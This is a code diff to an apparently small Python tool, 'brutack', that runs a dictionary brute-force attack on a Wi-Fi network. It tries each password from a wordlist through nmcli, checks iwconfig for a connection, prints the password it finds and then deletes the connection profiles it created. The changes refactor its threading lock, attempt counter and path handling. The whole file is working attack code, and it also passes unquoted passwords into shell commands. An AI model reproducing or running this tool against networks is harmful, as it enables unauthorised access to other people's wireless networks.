@@ -94,11 +94,11 @@ class writeLog:
             
 writeToLog = writeLog()
 Done = False
-attempt = []
+attempt = 0
 success = 0
 
 def check_connection(Verify = False):
-    time.sleep(7)
+    time.sleep(5)
     connection = os.popen('iwconfig', 'r')
     text = reduce((lambda x,y: str(x)+str(y)), connection.readlines() )
     ESSID = text.find('ESSID:')
@@ -114,28 +114,27 @@ def check_connection(Verify = False):
             return False
         
 
-def Brute(name, password):
+def Brute(name, password, lock):
     global Done, attempt
-    lock = threading.Lock()
     
     with lock:
         os.popen('nmcli dev wifi connect {0} password {1}'.format(name, password))
         connected = check_connection()
         
-        attempt.append(1)
+        attempt+=1
         
         if str(connected) != 'off':
             if not check_connection(Verify = True):
-                print('Password number', len(attempt), 'was tried. No result...')
+                print('Password number', attempt, 'was tried. No result...')
                 sys.exit()
             if check_connection(Verify = True):            
                 with writeToLog:
-                    print( 'Done! At '+str(len(attempt))+' try. \n\n\n\n!\n\n\n\nIts a "{0}"'.format(password))
+                    print( 'Done! At '+str(attempt)+' try. \n\n\n\n!\n\n\n\nIts a "{0}"'.format(password))
                     Done = True
                 sys.exit()
         else:
             with writeToLog:
-                print('Password number', len(attempt), 'was tried. No result...')
+                print('Password number', attempt, 'was tried. No result...')
             sys.exit()
 
 
@@ -148,7 +147,7 @@ if __name__ == '__main__':
         with open(sys.argv[2], 'r') as bruteWords:
             passwords = [ i.rstrip() for i in bruteWords]
     except FileNotFoundError:
-        file = str(os.getcwd())+'/'+str(sys.argv[2])
+        file = str(os.getcwd())+os.sep+str(sys.argv[2])
         with open(file, 'r') as bruteWords:
             passwords = [ i.rstrip() for i in bruteWords]
     except Exception:
@@ -163,35 +162,28 @@ The file with passwords must be in the same directory as "brutack", or contains
     ## This block is creating threads and trying connect to necessary wi-fi,
     ## using passwords from designated file.    
     try:
+        lock = threading.Lock()
         with writeToLog:
             for passw in passwords:
                 if not Done:
-                    x = threading.Thread( target = Brute, args = (name, passw))
+                    x = threading.Thread( target = Brute, args = (name, passw, lock))
                     x.start()
                     x.join()
                 else:
                     print('Brute-force attack well done. Exiting.')
                     break     
     except BrokenPipeError: # Some strange error... I don't know,
-    # what is it, so lets just pass it >.<
+    # what is it, so lets just pass it
         pass
     except Exception:
         with writeToLog:
             print('Unexpected error!', sys.exc_info())
             pass        
     finally:
-        for each in range(1, len(attempt)):
+        for each in range(1, attempt):
             x = os.popen("nmcli connection delete '{0} {1}'".format(name, each))
-            time.sleep(1)
+            time.sleep(2)
             x.close()
             with writeToLog:
                 print('connection', name, each, ' delete ')
-    ##
-            
-        
-
-
-
-
-
 #%%
